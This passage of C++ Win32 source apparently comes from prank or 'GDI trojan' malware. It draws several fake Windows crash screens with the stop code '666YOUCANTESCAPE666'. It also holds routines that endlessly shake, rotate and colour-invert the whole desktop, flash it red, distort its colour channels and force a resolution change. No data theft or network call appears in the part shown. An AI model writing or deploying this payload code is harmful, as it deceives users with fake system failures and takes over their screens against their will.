            L"*** STOP: 0x666YOUCANTESCAPE666 (0x666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666, 666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666)\n\n\n"
            L"Collecting data for crash dump...\n"
            L"Initializing disk for crash dump...\n"
            L"Beginning dump of physical memory...\n"
            L"Dumping physical memory to disk: 100";

        std::wstring errorText17 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then\n"
            L"restart your computer.\n\n"
            L"Technical Information:\n\n"
            L"*** STOP: 0x666YOUCANTESCAPE666 (0x666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666, 666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666)\n\n\n"
            L"Collecting data for crash dump...\n"
            L"Initializing disk for crash dump...\n"
            L"Beginning dump of physical memory...\n"
            L"Dumping physical memory to disk: 100\n"
            L"Physical memory dump complete.";

        std::wstring errorText18 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then\n"
            L"restart your computer.\n\n"
            L"Technical Information:\n\n"
            L"*** STOP: 0x666YOUCANTESCAPE666 (0x666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666, 666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666)\n\n\n"
            L"Collecting data for crash dump...\n"
            L"Initializing disk for crash dump...\n"
            L"Beginning dump of physical memory...\n"
            L"Dumping physical memory to disk: 100\n"
            L"Physical memory dump complete.\n"
            L"Contact your system admin or technical support group for further assistance.";

        RECT rect;
        GetClientRect(hwnd, &rect);
        DrawCenteredText(hdc, rect, errorText, 15);
        Sleep(30);
        DrawCenteredText(hdc, rect, errorText2, 15);
        Sleep(30);
        DrawCenteredText(hdc, rect, errorText3, 15);
        Sleep(30);
        DrawCenteredText(hdc, rect, errorText4, 15);
        Sleep(30);
        DrawCenteredText(hdc, rect, errorText5, 15);
        Sleep(30);
        DrawCenteredText(hdc, rect, errorText6, 15);
        Sleep(30);
        DrawCenteredText(hdc, rect, errorText7, 15);
        Sleep(30);
        DrawCenteredText(hdc, rect, errorText8, 15);
        Sleep(30);
        DrawCenteredText(hdc, rect, errorText9, 15);
        Sleep(30);
        DrawCenteredText(hdc, rect, errorText10, 15);
        Sleep(30);
        DrawCenteredText(hdc, rect, errorText11, 15);
        Sleep(1000);
        DrawCenteredText(hdc, rect, errorText12, 15);
        Sleep(1050);
        DrawCenteredText(hdc, rect, errorText13, 15);
        Sleep(500);
        DrawCenteredText(hdc, rect, errorText14, 15);
        Sleep(500);
        DrawCenteredText(hdc, rect, errorText15, 15);
        Sleep(10000);
        ClearText(hdc);
        DrawCenteredText(hdc, rect, errorText16, 15);
        Sleep(500);
        DrawCenteredText(hdc, rect, errorText17, 15);
        Sleep(500);
        DrawCenteredText(hdc, rect, errorText18, 15);
        EndPaint(hwnd, &ps);
    }
                 break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}
LRESULT CALLBACK WndProc2(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        HBRUSH blueBrush = CreateSolidBrush(RGB(17, 115, 170));
        FillRect(hdc, &ps.rcPaint, blueBrush);
        DeleteObject(blueBrush);

        std::wstring SadFace =
            L"\n    :(";

        std::wstring errorText =
            L"\n\n\n\n\n\n\n\n\n\n\n                      Your PC ran into a problem that it couldn't";

        std::wstring errorText2 =
            L"\n\n\n\n\n\n\n\n\n\n\n                      Your PC ran into a problem that it couldn't\n\n"
            L"                      handle, and now it needs to restart";

        std::wstring errorText3 =
            L"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                      You can search for the error code online: 666YOUCANTESCAPE666";

        RECT rect;
        GetClientRect(hwnd, &rect);
        DrawCenteredTextNew(hdc, rect, SadFace, 150);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText2, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText3, 15);
        EndPaint(hwnd, &ps);
    }
                 break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}
LRESULT CALLBACK WndProc3(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        HBRUSH blueBrush = CreateSolidBrush(RGB(0, 121, 216));
        FillRect(hdc, &ps.rcPaint, blueBrush);
        DeleteObject(blueBrush);

        std::wstring SadFace =
            L"\n    :(";

        std::wstring errorText =
            L"\n\n\n\n\n\n\n\n\n\n\n                      Your PC ran into a problem and needs to restart. We're";

        std::wstring errorText2 =
            L"\n\n\n\n\n\n\n\n\n\n\n                      Your PC ran into a problem and needs to restart. We're\n"
            L"                      just collecting some error info, and then we'll restart for";

        std::wstring errorText3 =
            L"\n\n\n\n\n\n\n\n\n\n\n                      Your PC ran into a problem and needs to restart. We're\n"
            L"                      just collecting some error info, and then we'll restart for\n"
            L"                      you.";

        std::wstring errorText4 =
            L"\n\n\n\n\n\n\n\n\n\n\n                      Your PC ran into a problem and needs to restart. We're\n"
            L"                      just collecting some error info, and then we'll restart for\n"
            L"                      you.\n\n"
            L"                      0% complete";

        std::wstring QRCode =
            L"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
            L"                      /////\n"
            L"                      /////";


        std::wstring errorText5 =
            L"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                     For more information about this issue and possible fixes, visit https;//www.windows.com/stopcode";

        std::wstring errorText6 =
            L"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                     If you call a support person, give them this info:\n\n"
            L"                                                     Stop code: 666YOUCANTESCAPE666";

        RECT rect;
        GetClientRect(hwnd, &rect);
        DrawCenteredTextNew(hdc, rect, SadFace, 150);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText2, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText3, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText4, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, QRCode, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText5, 15);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText6, 14);
        EndPaint(hwnd, &ps);
    }
                 break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}
LRESULT CALLBACK WndProc4(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &ps.rcPaint, blueBrush);
        DeleteObject(blueBrush);

        std::wstring SadFace =
            L"\n    :(";

        std::wstring errorText =
            L"\n\n\n\n\n\n\n\n\n\n\n                      Your PC ran into a problem and needs to restart.";

        std::wstring errorText2 =
            L"\n\n\n\n\n\n\n\n\n\n\n                      Your PC ran into a problem and needs to restart.\n"
            L"                      We're just collecting some error info, and then you can";

        std::wstring errorText3 =
            L"\n\n\n\n\n\n\n\n\n\n\n                      Your PC ran into a problem and needs to restart.\n"
            L"                      We're just collecting some error info, and then you can\n"
            L"                      restart.";

        std::wstring errorText4 =
            L"\n\n\n\n\n\n\n\n\n\n\n                      Your PC ran into a problem and needs to restart.\n"
            L"                      We're just collecting some error info, and then you can\n"
            L"                      restart.\n\n"
            L"                      0% complete";

        std::wstring QRCode =
            L"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
            L"                      //////////\n"
            L"                      //////////\n"
            L"                      //////////";


        std::wstring errorText5 =
            L"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                                    For more information about this issue and possible fixes, visit\n"
            L"                                                                                    https;//www.windows.com/stopcode";

        std::wstring errorText6 =
            L"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                                    If you call a support person, give them this info:\n"
            L"                                                                                    Stop code: 666YOUCANTESCAPE666";

        RECT rect;
        GetClientRect(hwnd, &rect);
        DrawCenteredTextNew(hdc, rect, SadFace, 150);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText2, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText3, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText4, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, QRCode, 30);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText5, 10);
        Sleep(30);
        DrawCenteredTextNew(hdc, rect, errorText6, 9);
        EndPaint(hwnd, &ps);
    }
                 break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}
void CaptureAndShake(HDC hdc, int shakeAmount) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    while (true) {

        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbmScreen = CreateCompatibleBitmap(hdc, screenWidth, screenHeight);
        SelectObject(hdcMem, hbmScreen);

        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdc, 0, 0, SRCCOPY);

        srand((unsigned int)time(NULL));
        for (int i = 0; i < 50; ++i) {
            int xOffset = (rand() % (2 * shakeAmount)) - shakeAmount;
            int yOffset = (rand() % (2 * shakeAmount)) - shakeAmount;

            BitBlt(hdc, xOffset, yOffset, screenWidth, screenHeight, hdcMem, 0, 0, SRCCOPY);

            Sleep(50);
        }

        DeleteObject(hbmScreen);
        DeleteDC(hdcMem);
    }
}
void InvertScreenColors(HDC hdc, int width, int height) {
    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdc, width, height);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmScreen);

    BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, SRCCOPY);

    BITMAPINFO bmpInfo = { 0 };
    bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmpInfo.bmiHeader.biWidth = width;
    bmpInfo.bmiHeader.biHeight = -height;
    bmpInfo.bmiHeader.biPlanes = 1;
    bmpInfo.bmiHeader.biBitCount = 32;
    bmpInfo.bmiHeader.biCompression = BI_RGB;

    void* pPixels = NULL;
    HBITMAP hbmDIB = CreateDIBSection(hdcMem, &bmpInfo, DIB_RGB_COLORS, &pPixels, NULL, 0);
    HBITMAP hbmOldDIB = (HBITMAP)SelectObject(hdcMem, hbmDIB);
    BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, SRCCOPY);

    BYTE* pData = (BYTE*)pPixels;
    int rowSize = ((width * 32 + 31) / 32) * 4;
    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            int index = (y * rowSize) + (x * 4);
            pData[index] = 255 - pData[index];
            pData[index + 1] = 255 - pData[index + 1];
            pData[index + 2] = 255 - pData[index + 2];
        }
    }

    BitBlt(hdc, 0, 0, width, height, hdcMem, 0, 0, SRCCOPY);

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmScreen);
    SelectObject(hdcMem, hbmOldDIB);
    DeleteObject(hbmDIB);
    DeleteDC(hdcMem);
}
bool SetResolution(int width, int height) {
    DEVMODE devMode;
    memset(&devMode, 0, sizeof(devMode));
    devMode.dmSize = sizeof(devMode);
    devMode.dmPelsWidth = width;
    devMode.dmPelsHeight = height;
    devMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;

    LONG result = ChangeDisplaySettings(&devMode, CDS_FULLSCREEN);

    if (result == DISP_CHANGE_SUCCESSFUL) {
        return true;
    }
    else {
        std::cout << "Failed to change resolution. Error code: " << result << std::endl;
        return false;
    }
}
void RotateAndDisplayScreen() {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdcScreen, w, h);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    const int angle1 = -15;
    const int angle2 = 15;
    const int interval = 100;
    int currentAngle = angle1;
    bool angleFlag = true;

    DWORD startTime = GetTickCount();

    while (true) {
        HDC hdcRot = CreateCompatibleDC(hdcScreen);
        HBITMAP hbmRot = CreateCompatibleBitmap(hdcScreen, w, h);
        HBITMAP hbmOldRot = (HBITMAP)SelectObject(hdcRot, hbmRot);

        PatBlt(hdcRot, 0, 0, w, h, BLACKNESS);

        POINT srcPoints[3] = { {0, 0}, {w, 0}, {0, h} };
        POINT destPoints[3];
        double radians = currentAngle * 3.14159 / 180.0;
        double cosA = cos(radians);
        double sinA = sin(radians);
        double cx = (double)w / 2;
        double cy = (double)h / 2;

        for (int i = 0; i < 3; ++i) {
            destPoints[i].x = (int)((srcPoints[i].x - cx) * cosA - (srcPoints[i].y - cy) * sinA + cx);
            destPoints[i].y = (int)((srcPoints[i].x - cx) * sinA + (srcPoints[i].y - cy) * cosA + cy);
        }

        PlgBlt(hdcRot, destPoints, hdcMem, 0, 0, w, h, NULL, 0, 0);

        BitBlt(hdcScreen, 0, 0, w, h, hdcRot, 0, 0, SRCCOPY);

        SelectObject(hdcRot, hbmOldRot);
        DeleteObject(hbmRot);
        DeleteDC(hdcRot);

        DWORD currentTime = GetTickCount();
        if (currentTime - startTime >= interval) {
            startTime = currentTime;
            currentAngle = (angleFlag) ? angle2 : angle1;
            angleFlag = !angleFlag;
        }

    }

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmTemp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
};
void RotateAndDisplayScreen2() {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdcScreen, w, h);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    const int angle1 = -15;
    const int angle2 = 15;
    const int interval = 100;
    int currentAngle = angle1;
    bool angleFlag = true;

    DWORD startTime = GetTickCount();

    while (true) {
        HDC hdcRot = CreateCompatibleDC(hdcScreen);
        HBITMAP hbmRot = CreateCompatibleBitmap(hdcScreen, w, h);
        HBITMAP hbmOldRot = (HBITMAP)SelectObject(hdcRot, hbmRot);

        PatBlt(hdcRot, 0, 0, w, h, BLACKNESS);

        POINT srcPoints[3] = { {0, 0}, {w, 0}, {0, h} };
        POINT destPoints[3];
        double radians = currentAngle * 3.14159 / 180.0;
        double cosA = cos(radians);
        double sinA = sin(radians);
        double cx = (double)w / 2;
        double cy = (double)h / 2;

        for (int i = 0; i < 3; ++i) {
            destPoints[i].x = (int)((srcPoints[i].x - cx) * cosA - (srcPoints[i].y - cy) * sinA + cx);
            destPoints[i].y = (int)((srcPoints[i].x - cx) * sinA + (srcPoints[i].y - cy) * cosA + cy);
        }

        PlgBlt(hdcRot, destPoints, hdcMem, 0, 0, w, h, NULL, 0, 0);

        BitBlt(hdcScreen, 0, 0, w, h, hdcRot, 0, 0, SRCPAINT);

        SelectObject(hdcRot, hbmOldRot);
        DeleteObject(hbmRot);
        DeleteDC(hdcRot);

        DWORD currentTime = GetTickCount();
        if (currentTime - startTime >= interval) {
            startTime = currentTime;
            currentAngle = (angleFlag) ? angle2 : angle1;
            angleFlag = !angleFlag;
        }

    }

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmTemp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
};
void RotateAndDisplayScreen3() {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdcScreen, w, h);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    const int angle1 = -15;
    const int angle2 = 15;
    const int interval = 100;
    int currentAngle = angle1;
    bool angleFlag = true;

    DWORD startTime = GetTickCount();

    while (true) {
        HDC hdcRot = CreateCompatibleDC(hdcScreen);
        HBITMAP hbmRot = CreateCompatibleBitmap(hdcScreen, w, h);
        HBITMAP hbmOldRot = (HBITMAP)SelectObject(hdcRot, hbmRot);

        PatBlt(hdcRot, 0, 0, w, h, BLACKNESS);

        POINT srcPoints[3] = { {0, 0}, {w, 0}, {0, h} };
        POINT destPoints[3];
        double radians = currentAngle * 3.14159 / 180.0;
        double cosA = cos(radians);
        double sinA = sin(radians);
        double cx = (double)w / 2;
        double cy = (double)h / 2;

        for (int i = 0; i < 3; ++i) {
            destPoints[i].x = (int)((srcPoints[i].x - cx) * cosA - (srcPoints[i].y - cy) * sinA + cx);
            destPoints[i].y = (int)((srcPoints[i].x - cx) * sinA + (srcPoints[i].y - cy) * cosA + cy);
        }

        PlgBlt(hdcRot, destPoints, hdcMem, 0, 0, w, h, NULL, 0, 0);

        BitBlt(hdcScreen, 0, 0, w, h, hdcRot, 0, 0, SRCAND);

        SelectObject(hdcRot, hbmOldRot);
        DeleteObject(hbmRot);
        DeleteDC(hdcRot);

        DWORD currentTime = GetTickCount();
        if (currentTime - startTime >= interval) {
            startTime = currentTime;
            currentAngle = (angleFlag) ? angle2 : angle1;
            angleFlag = !angleFlag;
        }

    }

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmTemp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
};
void RotateAndDisplayScreen4() {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdcScreen, w, h);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    const int angle1 = -15;
    const int angle2 = 15;
    const int interval = 100;
    int currentAngle = angle1;
    bool angleFlag = true;

    DWORD startTime = GetTickCount();

    while (true) {
        HDC hdcRot = CreateCompatibleDC(hdcScreen);
        HBITMAP hbmRot = CreateCompatibleBitmap(hdcScreen, w, h);
        HBITMAP hbmOldRot = (HBITMAP)SelectObject(hdcRot, hbmRot);

        PatBlt(hdcRot, 0, 0, w, h, BLACKNESS);

        POINT srcPoints[3] = { {0, 0}, {w, 0}, {0, h} };
        POINT destPoints[3];
        double radians = currentAngle * 3.14159 / 180.0;
        double cosA = cos(radians);
        double sinA = sin(radians);
        double cx = (double)w / 2;
        double cy = (double)h / 2;

        for (int i = 0; i < 3; ++i) {
            destPoints[i].x = (int)((srcPoints[i].x - cx) * cosA - (srcPoints[i].y - cy) * sinA + cx);
            destPoints[i].y = (int)((srcPoints[i].x - cx) * sinA + (srcPoints[i].y - cy) * cosA + cy);
        }

        PlgBlt(hdcRot, destPoints, hdcMem, 0, 0, w, h, NULL, 0, 0);

        BitBlt(hdcScreen, 0, 0, w, h, hdcRot, 0, 0, SRCERASE);

        SelectObject(hdcRot, hbmOldRot);
        DeleteObject(hbmRot);
        DeleteDC(hdcRot);

        DWORD currentTime = GetTickCount();
        if (currentTime - startTime >= interval) {
            startTime = currentTime;
            currentAngle = (angleFlag) ? angle2 : angle1;
            angleFlag = !angleFlag;
        }

    }

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmTemp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
};
void RotateAndDisplayScreen5() {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdcScreen, w, h);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    const int angle1 = -15;
    const int angle2 = 15;
    const int interval = 100;
    int currentAngle = angle1;
    bool angleFlag = true;

    DWORD startTime = GetTickCount();

    while (true) {
        HDC hdcRot = CreateCompatibleDC(hdcScreen);
        HBITMAP hbmRot = CreateCompatibleBitmap(hdcScreen, w, h);
        HBITMAP hbmOldRot = (HBITMAP)SelectObject(hdcRot, hbmRot);

        PatBlt(hdcRot, 0, 0, w, h, BLACKNESS);

        POINT srcPoints[3] = { {0, 0}, {w, 0}, {0, h} };
        POINT destPoints[3];
        double radians = currentAngle * 3.14159 / 180.0;
        double cosA = cos(radians);
        double sinA = sin(radians);
        double cx = (double)w / 2;
        double cy = (double)h / 2;

        for (int i = 0; i < 3; ++i) {
            destPoints[i].x = (int)((srcPoints[i].x - cx) * cosA - (srcPoints[i].y - cy) * sinA + cx);
            destPoints[i].y = (int)((srcPoints[i].x - cx) * sinA + (srcPoints[i].y - cy) * cosA + cy);
        }

        PlgBlt(hdcRot, destPoints, hdcMem, 0, 0, w, h, NULL, 0, 0);

        BitBlt(hdcScreen, 0, 0, w, h, hdcRot, 0, 0, SRCINVERT);

        SelectObject(hdcRot, hbmOldRot);
        DeleteObject(hbmRot);
        DeleteDC(hdcRot);

        DWORD currentTime = GetTickCount();
        if (currentTime - startTime >= interval) {
            startTime = currentTime;
            currentAngle = (angleFlag) ? angle2 : angle1;
            angleFlag = !angleFlag;
        }

    }

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmTemp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
};
void RotateScreen(float angle) {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdcScreen, w, h);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    HDC hdcRot = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmRot = CreateCompatibleBitmap(hdcScreen, w, h);
    HBITMAP hbmOldRot = (HBITMAP)SelectObject(hdcRot, hbmRot);

    PatBlt(hdcRot, 0, 0, w, h, BLACKNESS);

    POINT srcPoints[3] = { {0, 0}, {w, 0}, {0, h} };
    POINT destPoints[3];
    double radians = angle * 3.14159 / 180.0;
    double cosA = cos(radians);
    double sinA = sin(radians);
    double cx = (double)w / 2;
    double cy = (double)h / 2;

    for (int i = 0; i < 3; ++i) {
        destPoints[i].x = (int)((srcPoints[i].x - cx) * cosA - (srcPoints[i].y - cy) * sinA + cx);
        destPoints[i].y = (int)((srcPoints[i].x - cx) * sinA + (srcPoints[i].y - cy) * cosA + cy);
    }

    PlgBlt(hdcRot, destPoints, hdcMem, 0, 0, w, h, NULL, 0, 0);

    BitBlt(hdcScreen, 0, 0, w, h, hdcRot, 0, 0, SRCCOPY);

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmTemp);
    DeleteDC(hdcMem);
    SelectObject(hdcRot, hbmOldRot);
    DeleteObject(hbmRot);
    DeleteDC(hdcRot);
    ReleaseDC(NULL, hdcScreen);
}
void FlashScreenRed(HDC hdcScreen) {
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdcScreen, screenW, screenH);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

    HBRUSH hBrush = CreateSolidBrush(RGB(255, 0, 0));
    RECT rect = { 0, 0, screenW, screenH };

    for (int i = 0; i < 3; i++) {
        FillRect(hdcMem, &rect, hBrush);
        BLENDFUNCTION blendFunc = { AC_SRC_OVER, 0, 128, 0 };
        AlphaBlend(hdcScreen, 0, 0, screenW, screenH, hdcMem, 0, 0, screenW, screenH, blendFunc);

        Sleep(10);

        BitBlt(hdcScreen, 0, 0, screenW, screenH, hdcMem, 0, 0, SRCERASE);

        Sleep(10);
    }

    DeleteObject(hBrush);
    SelectObject(hdcMem, hbmOld);
    DeleteDC(hdcMem);
}
void ApplyRGB3DScrollEffect(HDC hdcScreen) {
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, screenW, screenH);
    SelectObject(hdcMem, hbmScreen);

    BitBlt(hdcMem, 0, 0, screenW, screenH, hdcScreen, 0, 0, SRCCOPY);

    int offset = 10;

    for (int x = 0; x < screenW; ++x) {
        for (int y = 0; y < screenH; ++y) {
            COLORREF pixel = GetPixel(hdcMem, x, y);
            SetPixel(hdcScreen, x - offset, y, RGB(GetRValue(pixel), 0, 0));
        }
    }

    for (int x = 0; x < screenW; ++x) {
        for (int y = 0; y < screenH; ++y) {
            COLORREF pixel = GetPixel(hdcMem, x, y);
            SetPixel(hdcScreen, x + offset, y, RGB(0, GetGValue(pixel), 0));
        }
    }

    for (int x = 0; x < screenW; ++x) {
        for (int y = 0; y < screenH; ++y) {
            COLORREF pixel = GetPixel(hdcMem, x, y);
            SetPixel(hdcScreen, x, y - offset, RGB(0, 0, GetBValue(pixel)));
        }
    }

    DeleteObject(hbmScreen);
    DeleteDC(hdcMem);
}
const float RE_C = -0.7f;
const float IM_C = 0.27015f;
const float ALPHA = 190.0f;

int JuliaSet(float x, float y, int maxIterations) {
    float zx = (x - 400.0f) / 200.0f;
    float zy = (y - 300.0f) / 200.0f;
    int i = 0;
    while (zx * zx + zy * zy < 4.0f && i < maxIterations) {
        float tmp = zx * zx - zy * zy + RE_C;
        zy = 2.0f * zx * zy + IM_C;
        zx = tmp;
        i++;
    }
    return i;
}

void RGBToHSL(COLORREF rgb, float& h, float& s, float& l) {
    float r = GetRValue(rgb) / 255.0f;
    float g = GetGValue(rgb) / 255.0f;
    float b = GetBValue(rgb) / 255.0f;

    float maxVal = max(r, max(g, b));
    float minVal = min(r, min(g, b));
    l = (maxVal + minVal) / 2.0f;

    if (maxVal == minVal) {
        h = s = 0;
    }
    else {
        float d = maxVal - minVal;
        s = l > 0.5f ? d / (2.0f - maxVal - minVal) : d / (maxVal + minVal);

        if (maxVal == r) {
            h = (g - b) / d + (g < b ? 6.0f : 0);
        }
        else if (maxVal == g) {
            h = (b - r) / d + 2.0f;
        }
        else {
            h = (r - g) / d + 4.0f;
        }
        h /= 6.0f;
    }
}

COLORREF HSLToRGB(float h, float s, float l) {
    float r, g, b;

    auto hue2rgb = [](float p, float q, float t) {
        if (t < 0) t += 1.0f;
        if (t > 1) t -= 1.0f;
        if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
        if (t < 1.0f / 3.0f) return q;
        if (t < 1.0f / 2.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
        return p;
        };

    if (s == 0) {
        r = g = b = l;
    }
    else {
        float q = l < 0.5f ? l * (1.0f + s) : l + s - l * s;
        float p = 2.0f * l - q;
        r = hue2rgb(p, q, h + 1.0f / 3.0f);
        g = hue2rgb(p, q, h);
        b = hue2rgb(p, q, h - 1.0f / 3.0f);
    }

    return RGB((int)(r * 255), (int)(g * 255), (int)(b * 255));
}

COLORREF AlphaBlend(COLORREF bgColor, COLORREF fgColor, float alpha) {
    BYTE bgR = GetRValue(bgColor);
    BYTE bgG = GetGValue(bgColor);
